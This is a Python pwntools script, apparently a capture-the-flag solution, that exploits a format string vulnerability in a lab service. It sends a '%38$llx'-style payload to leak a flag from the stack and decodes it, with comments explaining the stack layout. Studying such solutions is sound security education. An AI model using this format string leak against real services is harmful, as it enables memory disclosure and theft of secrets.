#!/usr/bin/python3

#import libraries
import sys
import pwn
import binascii
#get some pwn stuff into global namespace
from pwn import p64,sleep
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
pwn.context.log_level = 'error'

#assign host and port to connect to
host = "hacky2"
port = 13709
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


proc=pwn.remote(host,port,fam="ipv4")

proc.readline()

#Stacklayout (base denotes the beginning of main's stackframe):
#  base-0x000: return address main
#  base-0x008: pushed rbd of parent stack frame
#  base-0x108: char flag[0x100]
#  base-0x208: char buf[0x208]
#At the beginning of vuln a flag is generated and placed on the stack in the flag array.
#Then the user is prompted for input, which is stored in the buf array.
#Lastly printf is called on buf.
#Using positional arguments we can easily print data that lie on the stack before our buffer.
#Since the first 6 arguments are passed in registers and each argument is up to 64 bit long,
#  we get the following indices:
#  - index 0x00: rdi (this is the format string)
#  - index 0x01: rsi
#  - index 0x02: rdx
#  - index 0x03: rcx
#  - index 0x04: r8
#  - index 0x05: r9
#  - index 0x06: buf
#  - index 0x26: flag
#Hence printing 64 bit from the five arguments at index 0x26 (=38) to index 0x2A (=42) 
#will give us the flag.
#
#=> Format String: b'%38$llx %39$llx %40$llx %41$llx %42$llx \n' (Spaces to make splitting easier)
formatstr=b''
for i in range(38,43):
    formatstr += b'%' + str(i).encode() + b'$llx '
formatstr+=b"\n"

proc.write(formatstr)
proc.readuntil(b"Pwn harder, ")
outlist = proc.readuntil(b"!")[:-2].decode().split(' ')

#Since we interpreted the ASCII flag as 64-bit little-endian hexadecimal numbers with our format 
#  string, all that is left to do is decode is, before printing it in plain text.
flag = ""
for elem in outlist:
    hexnum = int(elem, 16)
    while hexnum != 0:
        flag += chr(hexnum & 0xFF)
        hexnum >>= 8

print(flag)

proc.close()


